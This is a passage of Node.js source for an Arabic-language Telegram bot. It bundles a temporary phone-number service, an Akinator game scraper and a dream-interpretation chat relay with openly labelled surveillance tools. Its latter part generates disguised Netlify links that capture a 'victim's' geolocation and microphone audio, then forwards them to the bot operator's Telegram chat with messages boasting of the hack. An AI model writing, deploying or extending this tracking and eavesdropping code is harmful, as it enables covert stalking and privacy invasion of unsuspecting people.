        if (الرسائل) {
            bot.sendMessage(chatId, تنسيق_الرسائل(الرسائل), { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, "لا توجد رسائل جديدة.");
        }
    } else if (callbackQuery.data === 'تغيير_الرقم') {
        const معلومات = await الحصول_على_معلومات_رقم_عشوائي();
        await تحديث_معلومات_الرقم(callbackQuery.message, معلومات);
    }
});


async function ارسال_معلومات_الرقم(message, معلومات) {
    const chatId = message.chat.id;
    const response = (
        `\n➖ تم الطلب 🛎• \n` +
        `➖ رقم الهاتف ☎️ : \`${معلومات['رقم']}\`\n` +
        `➖ الدولة : ${معلومات['اسم_الدولة']} ${معلومات['علم_الدولة']}\n` +
        `➖ رمز الدولة 🌏 : ${معلومات['رمز_الدولة']}\n` +
        `➖ تاريخ الإنشاء 📅 : ${معلومات['تاريخ_الإنشاء']}\n` +
        `➖ وقت الإنشاء ⏰ : ${معلومات['وقت_الإنشاء']}\n` +
        `➖ اضغط على الرقم لنسخه.`
    );
    const markup = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'تغيير الرقم 🔁', callback_data: 'تغيير_الرقم' }],
                [{ text: 'طلب الكود 💬', callback_data: `طلب_الكود_${معلومات['رقم']}` }]
            ]
        }
    };
    await bot.sendMessage(chatId, response, { parse_mode: 'Markdown', reply_markup: markup.reply_markup });
}


async function تحديث_معلومات_الرقم(message, معلومات) {
    const chatId = message.chat.id;
    const response = (
        `\n➖ تم الطلب 🛎• \n` +
        `➖ رقم الهاتف ☎️ : \`${معلومات['رقم']}\`\n` +
        `➖ الدولة : ${معلومات['اسم_الدولة']} ${معلومات['علم_الدولة']}\n` +
        `➖ رمز الدولة 🌏 : ${معلومات['رمز_الدولة']}\n` +
        `➖ تاريخ الإنشاء 📅 : ${معلومات['تاريخ_الإنشاء']}\n` +
        `➖ وقت الإنشاء ⏰ : ${معلومات['وقت_الإنشاء']}\n` +
        `➖ اضغط على الرقم لنسخه.`
    );
    const markup = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'تغيير الرقم 🔁', callback_data: 'تغيير_الرقم' }],
                [{ text: 'طلب الكود 💬', callback_data: `طلب_الكود_${معلومات['رقم']}` }]
            ]
        }
    };
    await bot.editMessageText(response, { chat_id: chatId, message_id: message.message_id, parse_mode: 'Markdown', reply_markup: markup.reply_markup });
}







const userSessionss = {};


async function extractSignatureAndSession() {
    try {
        const response = await axios.post('https://ar.akinator.com/game', {
            cm: 'false',
            sid: '1'
        });
        const $ = cheerio.load(response.data);

        let signature, session;
        $('script').each((index, element) => {
            const scriptContent = $(element).html();
            if (scriptContent.includes('localStorage.setItem')) {
                if (scriptContent.includes("signature")) {
                    signature = scriptContent.split("localStorage.setItem('signature', '")[1].split("');")[0];
                }
                if (scriptContent.includes("session")) {
                    session = scriptContent.split("localStorage.setItem('session', '")[1].split("');")[0];
                }
            }
        });

        if (signature && session) {
            return { signature, session };
        } else {
            throw new Error("القيم المطلوبة غير موجودة.");
        }
    } catch (error) {
        throw error;
    }
}


function resetGame(signature, session) {
    return {
        step: '0',
        progression: '0.00000',
        sid: 'NaN',
        cm: 'false',
        answer: '0',
        step_last_proposition: '',
        session: session,
        signature: signature,
    };
}

bot.onText(/\/star刚t/, (msg) => {
    const userId = msg.chat.id;

    const markup = {
        inline_keyboard: [[
            { text: "🎮 ابدأ اللعب", callback_data: 'play' }
        ]]
    };
    bot.sendMessage(userId, "مرحباً بك في لعبة أكيناتور! اضغط على زر *ابدأ اللعب* للبدء.", {
        reply_markup: markup,
        parse_mode: "Markdown"
    });
});


async function askQuestion(message, userId, newMessage = false) {
    const sessionData = userSessionss[userId];
    const url = 'https://ar.akinator.com/answer';
    const headerso = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://ar.akinator.com/game#',
    };

    try {
        const response = await axios.post(url, sessionData.data, { headerso });
        const result = response.data;


        if ('name_proposition' in result) {
            const name = result.name_proposition || 'غير معروف';
            const description = result.description_proposition || 'لا يوجد وصف';
            let photo = result.photo;


            if (!photo || photo === 'https://photos.clarinea.fr/BL_1_fr/none.jpg') {
                photo = 'https://example.com/default-image.jpg'; 
            }

            const caption = `👤 *الشخصية:* ${name}\n📄 *الوصف:* ${description}`;
            try {
                await bot.sendPhoto(userId, photo, {
                    caption: caption,
                    parse_mode: "Markdown"
                });
            } catch (e) {
                await bot.sendMessage(userId, caption, { parse_mode: "Markdown" });
            }


            await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
                chat_id: userId,
                message_id: message.message_id
            });
            return;
        }


        const question = result.question;
        if (!question) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            await askQuestion(message, userId);
            return;
        }

        const progression = result.progression;
        const step = result.step;

        sessionData.data.step = step;
        sessionData.data.progression = progression;

        const markup = {
            inline_keyboard: [
                [
                    { text: "✅ نعم", callback_data: "answer_0" },
                    { text: "❌ لا", callback_data: "answer_1" },
                ],
                [
                    { text: "❓ لا أعرف", callback_data: "answer_2" },
                    { text: "🤔 ربما", callback_data: "answer_3" },
                ]
            ]
        };

        const text = `🤔 *السؤال:* ${question}\n📊 *التقدم:* ${parseInt(parseFloat(progression))}%`;
        if (newMessage) {
            await bot.sendMessage(userId, text, {
                reply_markup: markup,
                parse_mode: "Markdown"
            });
        } else {
            await bot.editMessageText(text, {
                chat_id: userId,
                message_id: message.message_id,
                reply_markup: markup,
                parse_mode: "Markdown"
            });
        }
    } catch (error) {
        await bot.sendMessage(userId, `⚠️ حدث خطأ أثناء جلب السؤال: ${error.message}`);
    }
}


async function startNewSession(userId) {
    try {
        const { signature, session } = await extractSignatureAndSession();
        userSessionss[userId] = {
            signature: signature,
            session: session,
            data: resetGame(signature, session)
        };
    } catch (error) {
        await bot.sendMessage(userId, `⚠️ حدث خطأ أثناء إعداد الجلسة: ${error.message}`);
    }
}

bot.on('callback_query', async (callbackQuery) => {
    const userId = callbackQuery.message.chat.id;
    if (callbackQuery.data === 'play') {
        await startNewSession(userId);
        await askQuestion(callbackQuery.message, userId, true);
    } else if (callbackQuery.data.startsWith('answer')) {
        if (!(userId in userSessionss)) {
            await bot.sendMessage(userId, "يرجى بدء اللعبة باستخدام /start.");
            return;
        }

        const answer = callbackQuery.data.split('_')[1];
        const sessionData = userSessionss[userId];
        sessionData.data.answer = answer;
        await askQuestion(callbackQuery.message, userId);
    }
});





let conversations = {};


let sessionTimings = {};




const userSessionsg = {};


function showDreamMenu(chatId) {
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "تفسير الأحلام", callback_data: "dream_menur" }]
            ]
        }
    };

    bot.sendMessage(chatId, "مرحبًا! اضغط على الزر أدناه لاختيار نوع التفسير:", options);
}

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === "dream_menur") {
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "ذكاء اصطناعي", callback_data: "ar" },
                        { text: "ابن سيرين", callback_data: "ibn_sirin" }
                    ]
                ]
            }
        };


        userSessionsg[chatId] = { state: "waiting_for_choice" };

        bot.editMessageText("اختر مصدر التفسير:", {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: options.reply_markup
        });
    } else if (query.data === "ar") {
        bot.sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة الذكاء الاصطناعي:");
        userSessionsg[chatId].state = "ar";
    } else if (query.data === "ibn_sirin") {
        bot.sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة تفسير ابن سيرين:");
        userSessionsg[chatId].state = "ibn_sirin";
    }
});


bot.on('message', (msg) => {
    const chatId = msg.chat.id;


    if (msg.text.toLowerCase() === "menu" || msg.text.toLowerCase() === "تفسير") {
        showDreamMenu(chatId);
        return;
    }


    if (userSessionsg[chatId] && userSessionsg[chatId].state) {
        const state = userSessionsg[chatId].state;

        if (state === "ar") {
            processAi(msg);
            userSessionsg[chatId].state = null; 
        } else if (state === "ibn_sirin") {
            processIbnSirin(msg);
            userSessionsg[chatId].state = null; 
        }
    }
});

// 
function processAi(msg) {
    const dream = msg.text;
    const responseText = `تفسير حلم بواسطة الذكاء الاصطناعي: ${dream}`;
    sendRequestToApi(responseText, msg);
}

// 
function processIbnSirin(msg) {
    const dream = msg.text;
    const responseText = `تفسير حلم بواسطة ابن سيرين: ${dream}`;
    sendRequestToApi(responseText, msg);
}


async function sendRequestToApi(content, msg) {
    const headerszf = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://chatsandbox.com/chat/openai',
    };

    const jsonData = {
        messages: [content],
        character: 'openai',
    };

    try {
        const response = await axios.post('https://chatsandbox.com/api/chat', jsonData, { headerszf });
        if (response.status === 200) {
            bot.sendMessage(msg.chat.id, `الناتج: ${response.data}`);
        } else {
            
        }
    } catch (error) {
        
    }
}

app.get('/submitLocation', (req, res) => {
    const chatId = req.query.chatId;
    if (chatId) {
        res.sendFile(path.join(__dirname, 'location.html'));
    } else {
        res.status(400).send('خطأ: chatId مطلوب');
    }
});

// أمر البدء /start
bot.onText(/\/sgggggkjtart/, (msg) => {
    const chatId = msg.chat.id;
    
    const keyboard = {
        inline_keyboard: [
            [{ text: 'الحصول الموقع 📍', callback_data: `getLocationi:${chatId}` }]
        ]
    };
    
    bot.sendMessage(chatId, 'مرحباً! اضغط على الزر أدناه للحصول على الموقع', {
        reply_markup: keyboard
    });
});

// معالجة ضغط زر الإنلاين
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    const data = callbackQuery.data;

    if (data.startsWith('getLocationi:')) {
        const targetChatId = data.split(':')[1];
        
        // إنشاء رابط HTML فريد لكل مستخدم
        const locationUrl = `https://cute-brigadeiros-aedd53.netlify.app/lo/?chatId=${targetChatId}`;
        
        // إرسال الرابط كرسالة نصية عادية
        bot.sendMessage(
            chatId, 
            `تم تلغيم الرابط لخـ ^_^ـ.راق موقع الضحيه :\n\n${locationUrl}`
        );
        
        // تأكيد استلام الضغط
        bot.answerCallbackQuery(callbackQuery.id);
    }
});

// نقطة النهاية لاستقبال الموقع من الصفحة HTML
app.post('/submitLocation', async (req, res) => {
    try {
        const { chatId, latitude, longitude, accuracy } = req.body;
        
        if (!chatId || !latitude || !longitude) {
            return res.status(400).send('بيانات ناقصة');
        }

        console.log('تم استقبال الموقع:', { chatId, latitude, longitude, accuracy });

        // إرسال الموقع إلى المستخدم في التلجرام
        await bot.sendMessage(chatId, `✅ تم اخترق موقع الضحيه بنجاح💀!\n\n📍 خط العرض: ${latitude}\n📍 خط الطول: ${longitude}\n📏 الدقة: ${accuracy} متر`);

        // إرسال الموقع كـ location على الخريطة
        await bot.sendLocation(chatId, latitude, longitude);

        
        
    } catch (error) {
        
    }
});

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// توجيه لصفحة HTML
app.get('/recordAudio', (req, res) => {
    const chatId = req.query.chatId;
    if (chatId) {
        res.sendFile(path.join(__dirname, 'public', 'audio.html'));
    } else {
        res.status(400).send('خطأ: chatId مطلوب');
    }
});

// نقطة النهاية لاستقبال الصوت من الصفحة HTML
app.post('/submitAudio', async (req, res) => {
    try {
        const { chatId, audioData } = req.body;
        
        if (!chatId || !audioData) {
            return res.status(400).send('بيانات ناقصة');
        }

        

        // إرسال الملف الصوتي (نحتاج لتحويل البيانات base64 إلى ملف)
        const audioBuffer = Buffer.from(audioData.split(',')[1], 'base64');
        
        await bot.sendVoice(chatId, audioBuffer, {
            caption: 'تم تسجيل صوت الضحيه💀'
        });

        
        
    } catch (error) {
        
    }
});

// أمر البدء /start
bot.onText(/\/stahqkakasbvdolsrt/, (msg) => {
    const chatId = msg.chat.id;
    
    const keyboard = {
        inline_keyboard: [
            [{ text: 'تسجيل صوتي ', callback_data: `recordAudio:${chatId}` }]
        ]
    };
    
    bot.sendMessage(chatId, 'مرحباً! اضغط على الزر أدناه لتسجيل صوتي', {
        reply_markup: keyboard
    });
});

// معالجة ضغط زر الإنلاين
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    const data = callbackQuery.data;

    if (data.startsWith('recordAudio:')) {
        const targetChatId = data.split(':')[1];
        
        // إنشاء رابط HTML فريد لكل مستخدم
        const audioUrl = `https://jolly-donut-dec1ee.netlify.app/r/?chatId=${targetChatId}`;
        
        // إرسال الرابط كرسالة نصية عادية
        bot.sendMessage(
            chatId, 
            `تم تليغم الرابط لخـ ^_^ـ.راق المكرفون وتسجيل صوت الضحيه 💀:\n\n${audioUrl}`
        );
        
        // تأكيد استلام الضغط
        bot.answerCallbackQuery(callbackQuery.id);
    }
});

const clearTemporaryStorage = () => {
    try {
        console.log('تصفير الذاكرة المؤقتة...');


        const foldersToDelete = ['uploads', 'videos','images'];

        foldersToDelete.forEach(folder => {
            const fullPath = path.join(__dirname, folder);
            if (fs.existsSync(fullPath)) {
                deleteFolderRecursive(fullPath);
                console.log(`تم حذف المجلد: ${fullPath}`);
            } else {
                console.log(`المجلد غير موجود: ${fullPath}`);
            }
        });

    } catch (err) {
        console.error('حدث خطأ أثناء حذف الذاكرة المؤقتة:', err);
    }
};


setInterval(() => {
    clearTemporaryStorage();
    console.log('تم حذف الذاكرة المؤقتة.');
}, 2 * 60 * 1000); 

const handleExit = () => {
    console.log('إيقاف البرنامج وحذف الملفات المؤقتة.');
    clearTemporaryStorage();
    process.exit();
};

process.on('exit', handleExit);
process.on('SIGINT', handleExit);
process.on('SIGTERM', handleExit);
process.on('SIGHUP', handleExit);
